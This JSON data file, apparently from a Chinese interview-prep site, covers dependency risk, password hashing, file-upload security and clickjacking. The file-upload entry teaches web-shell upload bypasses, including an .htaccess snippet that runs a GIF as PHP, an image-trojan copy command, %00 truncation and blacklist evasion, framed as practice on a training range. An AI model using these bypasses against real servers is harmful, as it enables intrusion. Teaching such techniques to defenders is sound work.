你需要引入一个新库，但团队对其安全性存在争议，你会如何说服或解决？\n- 项目上线后，发现核心依赖库出现重大漏洞，但短期内无法停用，你会如何快速响应？\n- 如果你在项目中发现未经审核的库被私自引入，你会如何处理？\n\n**关键点**：\n- 候选人应展现应急处理能力和团队协作能力。\n\n---\n\n### **8. 第三方库的防御策略**\n#### **问题**：\n- 如何在 CI/CD 流程中集成依赖的安全检测？\n- 当库的安全性被破坏时，如何快速响应并修复？\n- 如何限制不受信任库的权限范围？\n\n**关键点**：\n- 集成 `npm audit`、`snyk` 等工具到 CI/CD 中。\n- 使用模块隔离技术（如 WebAssembly 或 iframe 沙箱）。\n\n---\n\n### **9. 与前端框架的结合**\n#### **问题**：\n- React/Vue 等框架在使用第三方库时，如何防范依赖风险？\n- 如何在微前端架构中控制各子应用对第三方库的依赖？\n\n**关键点**：\n- 框架的插件机制可能引入安全隐患，需验证插件的来源和行为。\n- 在微前端架构中，共享依赖需由主应用进行集中管理。\n\n---\n\n### **10. 开放性问题**\n#### **问题**：\n- 从技术债的角度，你认为引入第三方库是否总是值得？\n- 如何平衡开发效率与第三方库安全性的权衡？\n- 未来你认为如何改进第三方库的安全生态？\n\n**关键点**：\n- 考察候选人对技术决策的深度思考。",
    "exerciseKeyList": "[\"7f8684e3-e810-4bb4-aee0-28180db55fb0\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T03:31:11.000Z",
    "updateAt": "2024-12-05T01:41:11.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "7f8684e3-e810-4bb4-aee0-28180db55fb0",
        "title": "使用第三方库可能带来哪些安全风险？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-12-05T01:38:29.000Z",
        "updateAt": "2024-12-05T01:40:58.000Z"
      }
    ]
  },
  "44": {
    "id": 44,
    "tagId": 21,
    "title": "密码存储",
    "explanation": "我们在开发网站或者APP时，首先要解决的问题，就是**如何安全地传输和存储用户的密码**。一些大公司的用户数据库泄露事件也时有发生，带来非常大的负面影响。因此，如何安全传输存储用户密码，是每位程序员必备的基础。本文将跟大家一起学习，如何安全传输存储用户的密码。\n\n![image.png](https://static.ecool.fun//article/2c1dc781-7e88-4f4c-8213-d3f0d9a80884.awebp)\n\n### 1\\. 如何安全地传输用户的密码\n\n要拒绝用户密码在网络上裸奔，我们很容易就想到使用https协议，那先来回顾下https相关知识吧~\n\n#### 1.1 https 协议\n\n![image.png](https://static.ecool.fun//article/f866f496-49dd-4685-95ff-226fe9e7dbb8.awebp)\n\n-   **「http的三大风险」**\n\n为什么要使用https协议呢？**http它不香**吗? 因为http是明文信息传输的。如果在茫茫的网络海洋，使用http协议，有以下三大风险：\n\n> -   窃听/嗅探风险：第三方可以截获通信数据。\n> -   数据篡改风险：第三方获取到通信数据后，会进行恶意修改。\n> -   身份伪造风险：第三方可以冒充他人身份参与通信。\n\n如果传输不重要的信息还好，但是传输用户密码这些敏感信息，那可不得了。所以一般都要使用**https协议**传输用户密码信息。\n\n-   **「https 原理」**\n\nhttps原理是什么呢？为什么它能解决http的三大风险呢？\n\n> https = http + SSL/TLS, SSL/TLS 是传输层加密协议，它提供内容加密、身份认证、数据完整性校验，以解决数据传输的安全性问题。\n\n为了加深https原理的理解，我们一起复习一下 **一次完整https的请求流程**吧~\n\n![image.png](https://static.ecool.fun//article/92f403fb-4d8b-47f6-9724-dc926e686a37.awebp)\n\n> 1.  客户端发起https请求\n> 2.  服务器必须要有一套数字证书，可以自己制作，也可以向权威机构申请。这套证书其实就是一对公私钥。\n> 3.  服务器将自己的数字证书（含有公钥、证书的颁发机构等）发送给客户端。\n> 4.  客户端收到服务器端的数字证书之后，会对其进行验证，主要验证公钥是否有效，比如颁发机构，过期时间等等。如果不通过，则弹出警告框。如果证书没问题，则生成一个密钥（对称加密算法的密钥，其实是一个随机值），并且用证书的公钥对这个随机值加密。\n> 5.  客户端会发起https中的第二个请求，将加密之后的客户端密钥(随机值)发送给服务器。\n> 6.  服务器接收到客户端发来的密钥之后，会用自己的私钥对其进行非对称解密，解密之后得到客户端密钥，然后用客户端密钥对返回数据进行对称加密，这样数据就变成了密文。\n> 7.  服务器将加密后的密文返回给客户端。\n> 8.  客户端收到服务器发返回的密文，用自己的密钥（客户端密钥）对其进行对称解密，得到服务器返回的数据。\n\n-   **「https一定安全吗？」**\n\nhttps的数据传输过程，数据都是密文的，那么，使用了https协议传输密码信息，一定是安全的吗？其实不然\n\n> -   比如，https 完全就是建立在证书可信的基础上的呢。但是如果遇到中间人伪造证书，一旦客户端通过验证，安全性顿时就没了哦！平时各种钓鱼不可描述的网站，很可能就是黑客在诱导用户安装它们的伪造证书！\n> -   通过伪造证书，https也是可能被抓包的哦。\n\n#### 1.2 对称加密算法\n\n既然使用了https协议传输用户密码，还是 **「不一定安全」**，那么，我们就给用户密码 **「加密再传输」** 呗~\n\n加密算法有 **「对称加密」** 和 **「非对称加密」** 两大类。用哪种类型的加密算法 **「靠谱」** 呢？\n\n> 对称加密：加密和解密使用 **「相同密钥」** 的加密算法。\n\n![image.png](https://static.ecool.fun//article/ac6483e9-ef07-4219-93c9-3af9b2bf2f3c.awebp) 常用的对称加密算法主要有以下几种哈：\n\n![image.png](https://static.ecool.fun//article/771bc660-0122-4930-8fd4-a10077f57ba3.awebp) 如果使用对称加密算法，需要考虑 **「密钥如何给到对方」** ，如果密钥还是网络传输给对方，传输过程，被中间人拿到的话，也是有风险的哦。\n\n#### 1.3 非对称加密算法\n\n再考虑一下非对称加密算法呢？\n\n> **「非对称加密：」** 非对称加密算法需要两个密钥（公开密钥和私有密钥）。公钥与私钥是成对存在的，如果用公钥对数据进行加密，只有对应的私钥才能解密。\n\n![image.png](https://static.ecool.fun//article/23df0aac-b461-4d22-a5df-3d3ff75972bf.awebp)\n\n常用的非对称加密算法主要有以下几种哈：\n\n![image.png](https://static.ecool.fun//article/eca03752-2d3a-47c5-8b7d-ad81caa1c8fc.awebp)\n\n> 如果使用非对称加密算法，也需要考虑 **「密钥公钥如何给到对方」** ，如果公钥还是网络传输给对方，传输过程，被中间人拿到的话，会有什么问题呢？**「他们是不是可以伪造公钥，把伪造的公钥给客户端，然后，用自己的私钥等公钥加密的数据过来？」** 大家可以思考下这个问题哈~\n\n我们直接 **「登录一下百度」** ，抓下接口请求，验证一发大厂是怎么加密的。可以发现有获取公钥接口，如下:\n\n![image.png](https://static.ecool.fun//article/1ffc673d-7bc8-47a9-b41c-5d60c5ea6928.awebp) 再看下登录接口，发现就是RSA算法，RSA就是 **「非对称加密算法」** 。其实百度前端是用了JavaScript库 **「jsencrypt」** ，在github的star还挺多的。\n\n![image.png](https://static.ecool.fun//article/5d1de637-93b8-4e48-ab87-ee00149f7a90.awebp) 因此，我们可以用 **「https + 非对称加密算法（如RSA）」** 传输用户密码~\n\n### 2\\. 如何安全地存储你的密码？\n\n假设密码已经安全到达服务端啦，那么，如何存储用户的密码呢？一定不能明文存储密码到数据库哦！可以用 **「哈希摘要算法加密密码」** ，再保存到数据库。\n\n> 哈希摘要算法：只能从明文生成一个对应的哈希值，不能反过来根据哈希值得到对应的明文。\n\n#### 2.1  MD5摘要算法保护你的密码\n\nMD5 是一种非常经典的哈希摘要算法，被广泛应用于数据完整性校验、数据（消息）摘要、数据加密等。但是仅仅使用 MD5 对密码进行摘要，并不安全。我们看个例子，如下：\n\n```java\npublic class MD5Test {  \n    public static void main(String[] args) {  \n        String password = \"abc123456\";  \n        System.out.println(DigestUtils.md5Hex(password));  \n    }  \n}\n```\n\n运行结果： `0659c7992e268962384eb17fafe88364`\n\n在MD5免费破解网站一输入，马上就可以看到原密码了。。。\n\n![image.png](https://static.ecool.fun//article/af97b4e4-3e6c-49f2-9cf9-391fff97511e.awebp) 试想一下，如果黑客构建一个超大的数据库，把所有20位数字以内的数字和字母组合的密码全部计算MD5哈希值出来，并且把密码和它们对应的哈希值存到里面去（这就是 **「彩虹表」** ）。在破解密码的时候，只需要查一下这个彩虹表就完事了。所以 **「单单MD5对密码取哈希值存储」** ，已经不安全啦~\n\n#### 2.2  MD5+盐摘要算法保护用户的密码\n\n那么，为什么不试一下MD5+盐呢？什么是 **「加盐」**？\n\n> 在密码学中，是指通过在密码任意固定位置插入特定的字符串，让散列后的结果和使用原始密码的散列结果不相符，这种过程称之为“加盐”。\n\n用户密码+盐之后，进行哈希散列，再保存到数据库。这样可以有效应对彩虹表破解法。但是呢，使用加盐，需要注意一下几点：\n\n> -   不能在代码中写死盐，且盐需要有一定的长度（盐写死太简单的话，黑客可能注册几个账号反推出来）\n> -   每一个密码都有独立的盐，并且盐要长一点，比如超过 20 位。(盐太短，加上原始密码太短，容易破解)\n> -   最好是随机的值，并且是全球唯一的，意味着全球不可能有现成的彩虹表给你用。\n\n#### 2.3 提升密码存储安全的利器登场，Bcrypt\n\n即使是加了盐，密码仍有可能被暴力破解。因此，我们可以采取更 **「慢一点」** 的算法，让黑客破解密码付出更大的代价，甚至迫使他们放弃。提升密码存储安全的利器~Bcrypt，可以闪亮登场啦。\n\n> 实际上，Spring Security 已经废弃了 MessageDigestPasswordEncoder，推荐使用BCryptPasswordEncoder，也就是BCrypt来进行密码哈希。BCrypt 生而为保存密码设计的算法，相比 MD5 要慢很多。\n\n看个例子对比一下吧：\n\n```java\npublic class BCryptTest {  \n  \n    public static void main(String[] args) {  \n        String password = \"123456\";  \n        long md5Begin = System.currentTimeMillis();  \n        DigestUtils.md5Hex(password);  \n        long md5End = System.currentTimeMillis();  \n        System.out.println(\"md5 time:\"+(md5End - md5Begin));  \n        long bcrytBegin = System.currentTimeMillis();  \n        BCrypt.hashpw(password, BCrypt.gensalt(10));  \n        long bcrytEnd = System.currentTimeMillis();  \n        System.out.println(\"bcrypt Time:\" + (bcrytEnd- bcrytBegin));  \n    }  \n}\n```\n\n运行结果：\n\n`md5 time:47`\n\n`bcrypt Time:1597`\n\n粗略对比发现，BCrypt比MD5慢几十倍，黑客想暴力破解的话，就需要花费几十倍的代价。因此一般情况，建议使用Bcrypt来存储用户的密码\n\n### 3\\. 总结\n\n-   因此，一般使用https 协议 + 非对称加密算法（如RSA）来传输用户密码，为了更加安全，可以在前端构造一下随机因子哦。\n-   使用BCrypt + 盐存储用户密码。\n-   在感知到暴力破解危害的时候，**「开启短信验证、图形验证码、账号暂时锁定」** 等防御机制来抵御暴力破解。",
    "testPoint": "### **1. 基本概念与原理**\n#### **问题：**\n1. 为什么不能直接明文存储用户密码？  \n2. 什么是哈希（Hash）？哈希函数有什么特点？\n\n#### **考察点：**\n- **明文存储的风险**：\n  - 明文存储一旦泄露，攻击者可以直接获取所有用户的密码，后果严重。\n  - 用户往往在多个平台使用相同密码，因此泄露会带来连锁反应（撞库攻击）。\n\n- **哈希函数的特点**：\n  - 不可逆性：无法通过哈希值反推出原始输入。\n  - 雪崩效应：输入的微小改变会导致输出的哈希值发生巨大变化。\n  - 确定性：相同的输入总会得到相同的输出。\n\n---\n\n### **2. 密码加盐（Salt）的必要性**\n#### **问题：**\n1. 什么是加盐？为什么需要对密码进行加盐？  \n2. 如果不加盐，使用相同的密码会出现什么问题？\n\n#### **考察点：**\n- **加盐的定义**：\n  加盐是指在密码前后附加一段随机字符串（Salt），再进行哈希处理，确保相同的密码生成不同的哈希值。\n\n- **作用**：\n  - 防止彩虹表攻击（Rainbow Table Attack）：彩虹表是一种预计算的哈希值表，通过加盐，可以使攻击者难以匹配表中的哈希值。\n  - 增强唯一性：即使两个用户使用相同密码，加盐后也会生成不同的哈希值。\n\n- **示例**：\n  ```javascript\n  const crypto = require('crypto');\n  const salt = crypto.randomBytes(16).toString('hex'); // 随机盐\n  const hashedPassword = crypto.pbkdf2Sync(password, salt, 1000, 64, 'sha512').toString('hex');\n  ```\n\n---\n\n### **3. 常见密码哈希算法**\n#### **问题：**\n1. 密码存储中常用的哈希算法有哪些？  \n2. 为什么 MD5 和 SHA-1 不适合密码存储？\n\n#### **考察点：**\n- **常见哈希算法**：\n  - MD5（已不安全）\n  - SHA-1（已不安全）\n  - SHA-256、SHA-512（安全，但计算速度较快，易受暴力破解攻击）\n  - bcrypt、PBKDF2、scrypt、Argon2（推荐的密码存储算法）\n\n- **推荐算法特点**：\n  - **bcrypt**：\n    - 内置加盐。\n    - 可调整计算复杂度（通过 cost 参数控制）。\n    - 使用 Blowfish 加密算法，抗 GPU 暴力破解。\n  - **PBKDF2**：\n    - 基于 HMAC（哈希消息认证码）的加密算法。\n    - 支持多次迭代，增加破解成本。\n  - **scrypt**：\n    - 结合高计算成本和高内存消耗，特别适合抵抗大规模并行计算攻击。\n  - **Argon2**：\n    - 密码哈希竞赛获胜算法，被认为是当前最安全的密码存储算法。\n    - 支持灵活调整内存、时间和并行度，安全性极高。\n\n---\n\n### **4. 密码存储的具体实现**\n#### **问题：**\n1. 如何结合加盐和哈希存储用户密码？  \n2. 描述一个安全的密码校验过程。  \n\n#### **考察点：**\n- **存储过程**：\n  1. 用户注册时，生成随机盐。\n  2. 使用盐和密码进行哈希计算。\n  3. 将盐和哈希值一起存储到数据库。\n\n- **校验过程**：\n  1. 用户登录时，提取数据库中存储的盐。\n  2. 用相同的哈希算法对用户输入的密码和盐进行计算。\n  3. 将计算结果与存储的哈希值比对。\n\n- **示例**：\n  ```javascript\n  const verifyPassword = (password, salt, hash) => {\n    const hashToVerify = crypto.pbkdf2Sync(password, salt, 1000, 64, 'sha512').toString('hex');\n    return hashToVerify === hash;\n  };\n  ```\n\n---\n\n### **5. 密码存储的安全风险与防御**\n#### **问题：**\n1. 什么是彩虹表攻击？如何防御？  \n2. 如果数据库被泄露，如何最大限度地保护用户密码？  \n3. 密码哈希算法的迭代次数为什么很重要？\n\n#### **考察点：**\n- **彩虹表攻击**：\n  彩虹表是哈希值的预计算表，通过与目标哈希值比对，可以快速破解未加盐的密码。\n\n- **数据库泄露防御措施**：\n  - 使用强哈希算法（如 bcrypt、Argon2）。\n  - 使用独立的随机盐。\n  - 定期更新迭代次数，增加破解成本。\n\n- **迭代次数的作用**：\n  增加密码哈希的计算时间，使攻击者每次尝试都需要更多时间，从而降低暴力破解的可行性。\n\n---\n\n### **6. 密码强度检查**\n#### **问题：**\n1. 如何设计密码强度规则，确保用户密码的安全性？  \n2. 如何在密码存储的同时兼顾用户体验？\n\n#### **考察点：**\n- **密码强度规则**：\n  - 最小长度（如 8 位以上）。\n  - 包含大写字母、小写字母、数字和特殊字符。\n  - 避免常用密码（如 \"123456\"）。\n\n- **用户体验优化**：\n  - 提供实时密码强度提示。\n  - 避免设置过于复杂的规则，导致用户体验不佳。\n\n---\n\n### **7. 前后端协作**\n#### **问题：**\n1. 在前端和后端分别如何保障密码安全？  \n2. 如果攻击者窃取了前端传输的明文密码，有什么防御措施？\n\n#### **考察点：**\n- **前端措施**：\n  - 使用 HTTPS 确保传输安全。\n  - 可以在前端对密码进行预哈希处理，但后端仍需使用强哈希算法加盐存储。\n\n- **后端措施**：\n  - 永远不要直接存储明文密码。\n  - 确保后端的密码校验过程使用安全的哈希算法和盐。\n\n---\n\n### **8. 密码存储的进阶考察**\n#### **问题：**\n1. 如果密码算法升级（如从 SHA-256 切换到 bcrypt），如何处理老用户的密码？  \n2. 密码存储中如何实现多租户支持（不同用户组使用不同的密码策略）？\n\n#### **考察点：**\n- **算法升级**：\n  - 在用户下次登录时，将密码重新哈希并更新存储。\n  - 或者为每个用户添加字段记录当前哈希算法版本，在用户主动更新密码时进行升级。\n\n- **多租户支持**：\n  - 不同租户存储独立的盐。\n  - 使用动态配置的哈希算法或参数。",
    "exerciseKeyList": "[\"475b72b6-3c41-4509-afe3-abaaff8fc651\",\"f1de93ec-d1c8-48b0-98a9-bf256dfe2df0\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T03:37:49.000Z",
    "updateAt": "2024-12-16T01:30:18.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "475b72b6-3c41-4509-afe3-abaaff8fc651",
        "title": "前端数据安全",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:02:37.000Z",
        "updateAt": "2024-07-18T23:24:43.000Z"
      },
      {
        "exerciseKey": "f1de93ec-d1c8-48b0-98a9-bf256dfe2df0",
        "title": "前端的常规安全策略",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:03:43.000Z",
        "updateAt": "2024-07-18T23:19:13.000Z"
      }
    ]
  },
  "45": {
    "id": 45,
    "tagId": 21,
    "title": "文件上传安全",
    "explanation": "## 文件上传漏洞简介\n\n### **原理**\n\n> 攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本到服务器上,然后访问这些恶意脚本中包含的恶意代码,从而获得了执行服务器端命令的能力,进一步影响服务器安全。\n\n### 危害\n\n> 文件上传漏洞最直接的威胁就是上传任意文件，包括恶意脚本、可执行程序等。\n\n> 如果Web 服务器所保存上传文件的可写目录具有执行权限，那么就可以直接上传后门文件，导致网站沦陷。\n\n> 如果攻击者通过其他漏洞进行提权操纵，拿到系统管理权限，那么直接导致服务器沦陷。\n\n> 同服务器下的其他网站无一幸免，均会被攻击者控制。\n\n### 利用\n\n对于利用，我们只需要有个文件上传的点，以及我们知道我们所传的文件所在目录并且上传的恶意文件能够被web容器解析执行，便可能存在文件上传漏洞。\n\n## 实战\n\n说是实战但是因为不能随便入侵别人的机器(有概率获取银手镯一套)，这里给大家推荐一个专门用来练习文件上传漏洞的不同利用方法的靶场。\n\n> [github.com/c0ny1/uploa…](https://github.com/c0ny1/upload-labs \"https://github.com/c0ny1/upload-labs\")\n\n![up1.PNG](https://static.ecool.fun//article/ffebec2e-ea38-4183-950e-69b4aff3fcec.awebp) 可以看到里面有很多关卡，对于环境的搭建，这里我推荐用phpstudy去进行一键搭建，比较适合入门的萌新，具体搭建方法不是本文的重点，于是我们跳过，接下来给大家带来文件上传漏洞一些常见的绕过方法。\n\n### 客户端检测绕过\n\n有的客户端会存在客户端校验，校验上传文件的后缀名，当我们传入php木马时可能会因为类型不同被禁止，此时我们要怎么进行上传一句话木马呢，这里给大家提供两个思路，第一个我们可以禁用浏览器的JS脚本，第二种方法便是使用渗透中常用工具burpsuit进行抓包，然后修改文件后缀为php即可绕过，因为他只是做了一个前端的简单验证。\n\n### 修改MIME 类型\n\n有的服务器端将会对上传文件content-type类型进行检查以此来防范恶意文件的上传，这时我们打开burp suite将php文件上传，因为content-type的类型不是服务器认可的类型，那么我们就可以使用burpsuite进行修改该文件类型，并将该文件进行上传。\n\n常见的content-type对应类型如下：\n\n![up2.PNG](https://static.ecool.fun//article/fcfe08c2-ffd9-4f50-bcf8-d525171b098e.awebp)\n\n### **00截断绕过**\n\n运用此漏洞需要满足两个条件：\n\n> 1.php版本小于5.3.4 \n\n> 2.php的magic\\_quotes\\_gpc为OFF状态\n\n0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制，具体运用方法如下，假如我们上传一个一句话木马：\n\n攻击者修改了path以后的拼接结果为：uploads/XINO.php%00/20190818.php，移动文件的时候会将文件保存为：uploads/XINO.php，以此我们便可以绕过检测来上传一句话木马。\n\n### **.htaccess文件攻击**\n\n**.htaccess**文件(或者\"分布式配置文件\"）,全称是**Hypertext Access**(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个**指令**的文件， 以作用于此目录及其所有子目录。\n\n简单来说该文件的作用就是根据里面的内容解析为我们想要的类型，这么说可能很难理解，比如我上传一个图片马（JPG文件里插入了一句话木马），因为网站对我们的上传类型做了限制，我们上传不了PHP文件，我们先上传一个JPG的图片马，然后上传 **.htaccess文件，** 将图片解析为php语言，来达到getshell的目的。具体的文件内的内容为：\n\n```bash\n<FilesMatch \"evil.gif\">\nSetHandler application/x-httpd-php#在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行\nAddHandler php5-script .gif       #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行\n</FilesMatch>\n```\n\n当然不止这一种，还能如下写法：\n\n```bash\nAddHandler php5-script .jpg\n\n\nAddType application/x-httpd-php .jpg\n\n\nSethandler application/x-httpd-php\n```\n\n### 文件头检测\n\n当我们上传一些文件时，有些拦截会检测我们文件里的具体内容，如果匹配了正确的文件头则会通过检测，反之则会拦截我们的文件，针对如此我们可以利用在文件前写入适当文件类型的文件头来绕过。常用的文件头如下：\n\n> JPG：FF D8 FF E0 00 10 4A 46 49 46\n\n> GIF ：47 49 46 38 39 61 (GIF89a)\n\n> PNG：89 50 4E 47\n\n## **图片马绕过**\n\n图片马在上面提到过，当然该方法需要配合其他的利用方式来达到目的（文件包含）具体的制作方法如下：\n\n```bash\n copy 1.jpg/b+2.php 3.jpg\n```\n\n这是最平常的插入图片马的方法，我们还可以利用一些软件例如010editor来直接插入到图片数据中。\n\n### 黑白名单绕过\n\n一些拦截会限制我们上传的类型，具体可以分为以下两种：\n\n**黑名单**：明确不让上传的格式后缀(asp,php,jsp,aspx,cgi,war)，在黑名单中可能存在没有增加限制的漏网之鱼，此时可以通过这些没有禁止的后缀名来上传一句话木马,例如：php5,phtml\n\n**白名单**：明确可以上传的格式后缀,该方法还是比较安全的，但也有许多绕过方法，例：MIME类型、%00截断、0x00截断、0x0a截断。",
    "testPoint": "### **1. 文件上传的常见安全风险**\n#### **问题：**\n1. 文件上传可能带来哪些安全问题？  \n2. 一个未做限制的文件上传功能会有哪些潜在漏洞？\n\n#### **考察点：**\n- **常见风险**：\n  - **恶意文件上传**：攻击者上传带有恶意代码的文件，试图执行远程命令或注入恶意脚本。\n  - **任意文件上传**：允许上传任何格式的文件，可能导致敏感数据泄露或服务器负载增加。\n  - **文件名伪造**：通过伪装文件扩展名或文件类型绕过校验逻辑。\n  - **路径穿越攻击**：利用文件路径中的 `../` 等方式覆盖服务器上的关键文件。\n\n- **案例**：\n  - 上传一个 `.php` 文件执行后门程序。\n  - 上传超大文件导致服务器资源耗尽。\n\n---\n\n### **2. 文件类型校验**\n#### **问题：**\n1. 如何确保上传的文件是合法类型？  \n2. 仅在前端验证文件类型是否安全？为什么？\n\n#### **考察点：**\n- **前端校验**：\n  - 使用 `accept` 属性限制文件类型：\n    ```html\n    <input type=\"file\" accept=\".jpg, .png, .pdf\" />\n    ```\n  - 通过 JavaScript 检查 MIME 类型或扩展名。\n\n- **后端校验**：\n  - 解析文件头（Magic Number），验证文件的真实类型。\n    ```python\n    def is_valid_file(file):\n        allowed_types = [b'\\xff\\xd8\\xff', b'\\x89PNG']  # JPEG, PNG\n        file_header = file.read(3)\n        return file_header in allowed_types\n    ```\n  - 不能仅依赖扩展名或 MIME 类型，这些可能被伪造。\n\n- **重点**：\n  - 前端校验只能作为用户体验的一部分，真正的安全保障必须在后端实现。\n\n---\n\n### **3. 文件大小限制**\n#### **问题：**\n1. 如何防止攻击者通过上传超大文件消耗服务器资源？  \n2. 上传文件大小限制的最佳实践是什么？\n\n#### **考察点：**\n- **设置大小限制**：\n  - **前端**：通过 `maxSize` 设置文件大小限制，并及时提示用户。\n  - **后端**：在处理请求前检查文件大小。\n    ```javascript\n    if (file.size > MAX_SIZE) {\n        return res.status(400).send('File too large');\n    }\n    ```\n- **服务器配置**：\n  - Nginx 或 Apache 等 Web 服务器可配置最大请求体大小。\n    ```\n    client_max_body_size 10M;\n    ```\n  - 数据库存储时也需限制单个文件字段的容量。\n\n---\n\n### **4. 文件路径安全**\n#### **问题：**\n1. 文件上传时，如何防止路径穿越攻击？  \n2. 为什么不能直接使用用户提供的文件名存储文件？\n\n#### **考察点：**\n- **防路径穿越**：\n  - 禁止用户指定完整路径。\n  - 使用 `basename()` 提取文件名后存储到安全目录。\n  - 生成随机文件名或 UUID 避免路径冲突。\n    ```python\n    import uuid\n    safe_filename = f\"{uuid.uuid4()}.jpg\"\n    ```\n\n- **防止文件覆盖**：\n  - 使用时间戳或唯一标识符作为文件名前缀。\n  - 检查文件是否已存在，防止覆盖。\n\n---\n\n### **5. 存储安全**\n#### **问题：**\n1. 上传的文件应存储在哪些位置，为什么？  \n2. 上传文件存储到数据库和文件系统时，如何选择？\n\n#### **考察点：**\n- **存储位置**：\n  - **隔离存储**：将文件存储在独立的非 Web 根目录，防止通过 URL 直接访问文件。\n    ```\n    /uploads/\n    /var/www/myapp/\n    ```\n  - **第三方存储服务**：如 AWS S3、阿里云 OSS，减少对本地服务器的依赖。\n\n- **文件系统 vs 数据库**：\n  - **文件系统**：\n    - 适合大文件，性能更高。\n    - 需要妥善管理文件路径和命名。\n  - **数据库**：\n    - 更适合存储小文件，便于事务性操作。\n    - 可能导致数据库膨胀，降低性能。\n\n---\n\n### **6. 文件访问控制**\n#### **问题：**\n1. 如何限制文件的访问权限？  \n2. 如果需要用户验证后才能访问文件，该如何实现？\n\n#### **考察点：**\n- **设置文件权限**：\n  - 通过服务器配置或代码控制文件的读取权限。\n  - 例如，Nginx 的 `autoindex off;` 禁止目录索引。\n\n- **授权访问**：\n  - 文件访问 URL 应动态生成，并绑定用户信息或有效期。\n    ```javascript\n    const generateSecureURL = (filePath) => {\n        const token = createToken(filePath, expiryTime);\n        return `/download?file=${filePath}&token=${token}`;\n    };\n    ```\n\n---\n\n### **7. 文件扫描与内容过滤**\n#### **问题：**\n1. 如何检查上传文件是否包含恶意内容？  \n2. 上传的图片可能被嵌入恶意脚本吗？如何防御？\n\n#### **考察点：**\n- **病毒扫描**：\n  - 使用杀毒软件或工具（如 ClamAV）对上传的文件进行扫描。\n    ```bash\n    clamscan --infected --remove file.jpg\n    ```\n\n- **内容过滤**：\n  - 对文件内容进行检查，如移除图片中的恶意代码（嵌入式 JS）。\n  - 对用户上传的文档（如 `.docx`）使用沙箱或专用解析器进行安全解析。\n\n---\n\n### **8. 上传接口的安全保障**\n#### **问题：**\n1. 如何防止文件上传接口被滥用？  \n2. 文件上传接口是否容易被 DOS 攻击？如何防御？\n\n#### **考察点：**\n- **接口安全**：\n  - 添加身份验证或权限检查，确保只有授权用户可以上传。\n  - 限制每个用户的上传次数或流量。\n\n- **防止 DOS 攻击**：\n  - 配置 Web 服务器的速率限制（如 Nginx 的 `limit_req`）。\n  - 设置防火墙规则限制请求频率。\n\n---\n\n### **9. 前端与后端的协作**\n#### **问题：**\n1. 如何设计一个前端友好、后端安全的文件上传流程？  \n2. 文件上传失败后如何处理？\n\n#### **考察点：**\n- **流程设计**：\n  1. 前端实时校验文件大小、类型等基本信息。\n  2. 后端接收到文件后进行严格的安全检查。\n  3. 使用分片上传和断点续传减少失败影响。\n  \n- **失败处理**：\n  - 提供详细的错误信息。\n  - 可通过队列机制或后台任务重新上传。\n\n---\n\n### **10. 综合实践问题**\n#### **问题：**\n1. 如何设计一个支持大文件上传的安全系统？  \n2. 假如上传服务上线后出现文件伪造攻击，如何快速响应并修复？\n\n#### **考察点**：\n- **大文件上传**：\n  - 使用分片上传技术（如 `chunk`）。\n  - 对每个分片进行验证，上传完成后重新校验文件完整性（如 MD5 校验）。\n\n- **响应攻击**：\n  - 暂时关闭上传接口。\n  - 增加文件头验证逻辑。\n  - 检查历史文件存储的安全性，并修复潜在漏洞。\n",
    "exerciseKeyList": "[\"dfc602d9-11d7-4730-99e2-312b4236f206\",\"8c5e8658-706c-448c-bce9-3bdbb615b625\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T03:55:55.000Z",
    "updateAt": "2024-12-16T01:35:09.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "8c5e8658-706c-448c-bce9-3bdbb615b625",
        "title": "怎么实现大型文件上传？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-17T11:50:24.000Z",
        "updateAt": "2024-08-10T17:06:49.000Z"
      },
      {
        "exerciseKey": "dfc602d9-11d7-4730-99e2-312b4236f206",
        "title": "如何实现文件上传？说说你的思路",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-25T02:23:00.000Z",
        "updateAt": "2024-08-10T17:05:33.000Z"
      }
    ]
  },
  "46": {
    "id": 46,
    "tagId": 21,
    "title": "点击劫持",
    "explanation": "## 一、简介\n\n点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe,覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。\n\n![clickjacking-attacks.png](https://static.ecool.fun//article/13f03e80-03f0-4794-bda9-26f34fb08576.awebp)\n\n虽然受害者点击的是他所看到的网页，但其实他所点击的是被**黑客精心构建的另一个置于原网页上面的透明页面**\n\nClickjacking 是仅此于 XSS 和 CSRF 的前端漏洞，因为需要诱使用户交互，攻击成本高，所以不被重视，但危害不容小觑。\n\n**点击劫持的步骤**\n\n1.  黑客创建一个网页利用 iframe 包含目标网站；\n2.  隐藏目标网站，使用户无法无法察觉到目标网站存在；\n3.  构造网页，诱变用户点击特点按钮；\n4.  用户在不知情的情况下点击按钮，触发执行恶意网页的命令；\n\n## 二、劫持类型\n\n### 2.1 Flash点击劫持\n\n攻击者通过flash构造了点击劫持，在完成一系列复杂的动作后，最终控制了用户的摄像头。\n\n攻击者制作了一个Flash游戏，这个游戏就是让用户去点击“CLICK”按钮，每次点击后这个按钮的位置都会发生变化。在Flash上面隐藏了一个看不见的iframe，游戏中某些点击时是有意义的，有些点击是无效的。 攻击通过诱导用户鼠标点击就能完成较复杂的动作。最终通过这一步步操作，打开了用户的摄像头。\n\n![image-20221223140942247.png](https://static.ecool.fun//article/fad2975c-222d-4da7-b6ee-09657a2782b9.awebp) 